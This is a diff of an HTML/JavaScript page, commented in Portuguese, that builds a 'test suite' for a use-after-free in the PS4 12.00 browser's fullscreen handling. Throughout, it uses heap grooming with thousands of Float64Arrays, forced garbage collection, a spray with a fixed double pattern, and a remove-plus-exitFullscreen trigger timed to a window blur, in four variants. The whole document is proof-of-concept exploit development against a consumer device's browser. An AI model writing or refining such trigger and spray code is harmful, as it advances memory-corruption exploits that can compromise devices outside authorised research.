@@ -2,95 +2,140 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 12.00 - Fullscreen UAF (Teste 4 ISOLADO)</title>
+<title>PS4 Fullscreen UAF - Test Suite</title>
 </head>
-<body>
+<body style="background:#222;color:#fff;">
 
-<h2>PS4 12.00 - Fullscreen UAF (Teste 4 - 100% Crash)</h2>
-<button onclick="runTest()">Run Test</button>
+<h2>PS4 12.00 - Fullscreen UAF Test Suite</h2>
 
-<pre id="log" style="background:#111;color:#0f0;padding:10px;height:300px;overflow:auto;"></pre>
+<button onclick="runTest(1)">Teste 1 — Completo (GC + Spray)</button><br><br>
+<button onclick="runTest(2)">Teste 2 — Sem GC</button><br><br>
+<button onclick="runTest(3)">Teste 3 — Sem Spray</button><br><br>
+<button onclick="runTest(4)">Teste 4 — Apenas remove + exitFullscreen</button>
+
+<div id="log" style="margin-top:20px;"></div>
 
 <script>
 const PATTERN = 2.121995791e-314;
 
 function log(msg) {
-    document.getElementById("log").textContent += msg + "\n";
+    try { console.log(msg); } catch(e){}
+    document.getElementById("log").innerHTML += "<p>" + msg + "</p>";
 }
 
-function runTest() {
+function setupHeap() {
+    let controllers = [];
 
-    log("[*] Iniciando teste...");
-    
-    let arr = new Float64Array(8);
-    arr[0] = 13.37;
+    for(let i = 0; i < 5000; i++) {
+        let arr = new Float64Array(8);
+        arr[0] = i;
+        controllers.push(arr);
+    }
 
-    log("[+] Objeto criado");
+    return controllers;
+}
 
-    // Elemento alvo (CRÍTICO)
+function setupFullscreen() {
     let fsTarget = document.createElement("div");
+    fsTarget.innerHTML = "<h1 style='margin-top:20%;text-align:center;'>FULLSCREEN ACTIVE<br>Press OPTIONS</h1>";
+    fsTarget.style.background = "black";
     fsTarget.style.width = "100%";
     fsTarget.style.height = "100%";
+    fsTarget.style.position = "absolute";
+    fsTarget.style.top = "0";
+    fsTarget.style.left = "0";
+
     document.body.appendChild(fsTarget);
 
-    // Eventos importantes (não alteram timing)
-    document.addEventListener("fullscreenchange", () => {
-        log("[EVENT] fullscreenchange");
-    });
+    if (fsTarget.webkitRequestFullscreen) {
+        fsTarget.webkitRequestFullscreen();
+    } else {
+        document.documentElement.webkitRequestFullscreen?.();
+    }
 
-    document.addEventListener("visibilitychange", () => {
-        log("[EVENT] visibility: " + document.visibilityState);
-    });
+    return fsTarget;
+}
 
-    // Entrar em fullscreen
-    fsTarget.webkitRequestFullscreen?.();
+function doGC(controllers) {
+    log("[*] Forçando GC...");
+    controllers = null;
 
-    // PONTO CRÍTICO — esperar interação do usuário
+    for (let i = 0; i < 20000; i++) {
+        new ArrayBuffer(0x10000);
+    }
+}
+
+function doSpray() {
+    log("[*] Executando spray...");
+    let spray = [];
+
+    for(let i = 0; i < 8000; i++) {
+        let p = new Float64Array(10);
+        p.fill(PATTERN);
+        spray.push(p);
+    }
+
+    return spray;
+}
+
+function trigger(fsTarget) {
+    log("[*] Trigger: remove + exitFullscreen");
+
+    try {
+        fsTarget.remove();
+
+        if (document.webkitIsFullScreen || document.fullscreenElement) {
+            document.webkitExitFullscreen?.() || document.webkitCancelFullScreen?.();
+        }
+    } catch(e) {
+        log("[ERRO] " + e);
+    }
+
+    setTimeout(() => location.reload(), 500);
+}
+
+function runTest(mode) {
+    const logDiv = document.getElementById("log");
+    logDiv.innerHTML = "<p>Running... Press OPTIONS</p>";
+
+    log("[*] Iniciando teste " + mode);
+
+    let controllers = setupHeap();
+    let fsTarget = setupFullscreen();
+
     window.onblur = function() {
+        log("[*] onblur disparado");
 
-        window.onblur = null;
+        // =========================
+        // TESTES
+        // =========================
 
-        log("[*] onblur recebido (OPTIONS detectado)");
+        if (mode === 1) {
+            // COMPLETO
+            doGC(controllers);
+            let spray = doSpray();
 
-        // 🔥 GC LEVE (não agressivo pra não quebrar timing)
-        for (let i = 0; i < 2000; i++) {
-            new ArrayBuffer(0x1000);
+            setTimeout(() => trigger(fsTarget), 3000);
         }
 
-        log("[*] GC leve executado");
+        else if (mode === 2) {
+            // SEM GC
+            let spray = doSpray();
 
-        // 🔥 Spray leve
-        let spray = [];
-        for (let i = 0; i < 2000; i++) {
-            let p = new Float64Array(10);
-            p.fill(PATTERN);
-            spray.push(p);
+            setTimeout(() => trigger(fsTarget), 3000);
         }
 
-        log("[*] Spray leve executado");
+        else if (mode === 3) {
+            // SEM SPRAY
+            doGC(controllers);
 
-        // ⏱️ DELAY CRÍTICO — mantém janela do bug
-        setTimeout(() => {
+            setTimeout(() => trigger(fsTarget), 3000);
+        }
 
-            log("[*] Trigger UAF (remove + exitFullscreen)");
-
-            // 🔥 ESSÊNCIA DO BUG
-            fsTarget.remove();
-            document.webkitExitFullscreen?.();
-
-            // Pequena observação antes do crash
-            setTimeout(() => {
-                try {
-                    log("---- CHECK PRÉ-CRASH ----");
-                    log("[F64] " + arr[0]);
-                    log("[META] len=" + arr.length + " byteLength=" + arr.byteLength);
-                } catch(e) {
-                    log("[ERRO] " + e);
-                }
-            }, 50);
-
-        }, 500); // ⚠️ ESSENCIAL
-
+        else if (mode === 4) {
+            // MINIMO (CIRÚRGICO)
+            setTimeout(() => trigger(fsTarget), 3000);
+        }
     };
 }
 </script>
